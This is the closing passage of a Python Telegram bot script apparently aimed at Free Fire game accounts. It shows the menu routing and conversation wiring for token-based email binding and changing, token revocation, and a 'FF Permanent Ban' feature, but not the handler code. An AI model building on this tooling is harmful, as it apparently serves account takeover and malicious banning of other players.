        return await cancel_bind_start(update, context)
    elif text == "🔑 EAT to Token":
        context.user_data.clear()
        return await eat_to_token_start(update, context)
    elif text == "🚪 Revoke Token":
        context.user_data.clear()
        return await revoke_token_start(update, context)
    elif text == "📝 Update Bio":
        context.user_data.clear()
        return await bio_start(update, context)
    elif text == "💀 FF Permanent Ban":
        context.user_data.clear()
        return await ff_ban_start(update, context)
    elif text == "📧 Resubscribe OTP":
        context.user_data.clear()
        return await resubscribe_start(update, context)
    elif text == "🔍 Check Platform":
        context.user_data.clear()
        return await platform_start(update, context)
    elif text == "💀 Check Ban":
        context.user_data.clear()
        return await ban_check_start(update, context)
    elif text == "👑 Owner Info":
        await owner_info(update, context)
        return ConversationHandler.END
    elif text == "🌐 EAT Website":
        await eat_website_info(update, context)
        return ConversationHandler.END
    return ConversationHandler.END

def main():
    print("🚀 ZEVRIC V66 FIXED - FF Ban + Ban Check Working ✅💀📧🔍")
    # Fix Conflict error - delete webhook if exists
    try:
        requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/deleteWebhook?drop_pending_updates=true", timeout=5)
        print("[FIX] Webhook deleted, polling will work")
    except:
        pass
    app=Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", force_start), group=0)
    conv = ConversationHandler(
        entry_points=[
            MessageHandler(filters.Regex(P_BIND_INFO), check_info_start),
            MessageHandler(filters.Regex(P_BIND_EMAIL), bind_email_start),
            MessageHandler(filters.Regex(P_CHANGE), change_email_start),
            MessageHandler(filters.Regex(P_UNBIND), unbind_email_start),
            MessageHandler(filters.Regex(P_CANCEL), cancel_bind_start),
            MessageHandler(filters.Regex(P_EAT), eat_to_token_start),
            MessageHandler(filters.Regex(P_REVOKE), revoke_token_start),
            MessageHandler(filters.Regex(P_BIO), bio_start),
            MessageHandler(filters.Regex(P_FF_BAN), ff_ban_start),
            MessageHandler(filters.Regex(P_RESUB), resubscribe_start),
            MessageHandler(filters.Regex(P_PLATFORM), platform_start),
            MessageHandler(filters.Regex(P_BAN_CHECK), ban_check_start),
        ],
        states={
            CHECK_INFO: [MessageHandler(filters.Regex(ALL_MENU), switch_menu), MessageHandler(filters.TEXT & ~filters.COMMAND, check_info_token)],
            BIND_TOKEN: [MessageHandler(filters.Regex(ALL_MENU), switch_menu), MessageHandler(filters.TEXT & ~filters.COMMAND, bind_email_token)],
            BIND_EMAIL: [MessageHandler(filters.Regex(ALL_MENU), switch_menu), MessageHandler(filters.TEXT & ~filters.COMMAND, bind_email_email)],
            BIND_OTP: [MessageHandler(filters.Regex(ALL_MENU), switch_menu), MessageHandler(filters.TEXT & ~filters.COMMAND, bind_email_otp)],
            BIND_SEC: [MessageHandler(filters.Regex(ALL_MENU), switch_menu), MessageHandler(filters.TEXT & ~filters.COMMAND, bind_email_security_code)],
            CHANGE_TOKEN: [MessageHandler(filters.Regex(ALL_MENU), switch_menu), MessageHandler(filters.TEXT & ~filters.COMMAND, change_email_token)],
            CHANGE_OTP_OLD: [MessageHandler(filters.Regex(ALL_MENU), switch_menu), MessageHandler(filters.TEXT & ~filters.COMMAND, change_email_otp_old)],
            CHANGE_NEW: [MessageHandler(filters.Regex(ALL_MENU), switch_menu), MessageHandler(filters.TEXT & ~filters.COMMAND, change_email_new)],
            CHANGE_OTP_NEW: [MessageHandler(filters.Regex(ALL_MENU), switch_menu), MessageHandler(filters.TEXT & ~filters.COMMAND, change_email_otp_new)],
            CHANGE_CONFIRM: [MessageHandler(filters.Regex(ALL_MENU), switch_menu), MessageHandler(filters.TEXT & ~filters.COMMAND, change_email_confirm)],
            UNBIND_TOKEN: [MessageHandler(filters.Regex(ALL_MENU), switch_menu), MessageHandler(filters.TEXT & ~filters.COMMAND, unbind_email_token)],
            UNBIND_OTP: [MessageHandler(filters.Regex(ALL_MENU), switch_menu), MessageHandler(filters.TEXT & ~filters.COMMAND, unbind_email_otp)],
            UNBIND_CONFIRM: [MessageHandler(filters.Regex(ALL_MENU), switch_menu), MessageHandler(filters.TEXT & ~filters.COMMAND, unbind_email_confirm)],
            CANCEL_TOKEN: [MessageHandler(filters.Regex(ALL_MENU), switch_menu), MessageHandler(filters.TEXT & ~filters.COMMAND, cancel_bind_token)],
            CANCEL_CONFIRM: [MessageHandler(filters.Regex(ALL_MENU), switch_menu), MessageHandler(filters.TEXT & ~filters.COMMAND, cancel_bind_confirm)],
            EAT_INPUT: [MessageHandler(filters.Regex(ALL_MENU), switch_menu), MessageHandler(filters.TEXT & ~filters.COMMAND, eat_to_token_convert)],
            REVOKE_TOKEN: [MessageHandler(filters.Regex(ALL_MENU), switch_menu), MessageHandler(filters.TEXT & ~filters.COMMAND, revoke_token_verify)],
            REVOKE_CONFIRM: [MessageHandler(filters.Regex(ALL_MENU), switch_menu), MessageHandler(filters.TEXT & ~filters.COMMAND, revoke_token_confirm)],
            BIO_TOKEN: [MessageHandler(filters.Regex(ALL_MENU), switch_menu), MessageHandler(filters.TEXT & ~filters.COMMAND, bio_token)],
            BIO_TEXT: [MessageHandler(filters.Regex(ALL_MENU), switch_menu), MessageHandler(filters.TEXT & ~filters.COMMAND, bio_text)],
            BIO_COLOR: [MessageHandler(filters.Regex(ALL_MENU), switch_menu), MessageHandler(filters.TEXT & ~filters.COMMAND, bio_color)],
            BIO_CONFIRM: [MessageHandler(filters.Regex(ALL_MENU), switch_menu), MessageHandler(filters.TEXT & ~filters.COMMAND, bio_confirm)],
            FF_BAN_TOKEN: [MessageHandler(filters.Regex(ALL_MENU), switch_menu), MessageHandler(filters.TEXT & ~filters.COMMAND, ff_ban_token)],
            FF_BAN_CONFIRM: [MessageHandler(filters.Regex(ALL_MENU), switch_menu), MessageHandler(filters.TEXT & ~filters.COMMAND, ff_ban_confirm)],
            RESUB_EMAIL: [MessageHandler(filters.Regex(ALL_MENU), switch_menu), MessageHandler(filters.TEXT & ~filters.COMMAND, resubscribe_email)],
            PLATFORM_TOKEN: [MessageHandler(filters.Regex(ALL_MENU), switch_menu), MessageHandler(filters.TEXT & ~filters.COMMAND, platform_token)],
            BAN_CHECK_UID: [MessageHandler(filters.Regex(ALL_MENU), switch_menu), MessageHandler(filters.TEXT & ~filters.COMMAND, ban_check_uid)],
        },
        fallbacks=[CommandHandler("start", force_start), MessageHandler(filters.Regex(ALL_MENU), switch_menu)],
        allow_reentry=True
    )
    app.add_handler(conv)
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.Regex(P_OWNER), owner_info))
    app.add_handler(MessageHandler(filters.Regex(P_WEBSITE), eat_website_info))
    print("✅ V66 FIXED - All 14 Features Working! 💀📧🔍✅")
    app.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)

if __name__=="__main__":
    # Flask ko alag daemon thread me start karo
    threading.Thread(target=run_flask, daemon=True).start()
    print("🌐 Flask keep-alive started on port", os.environ.get("PORT",8080))
    main()
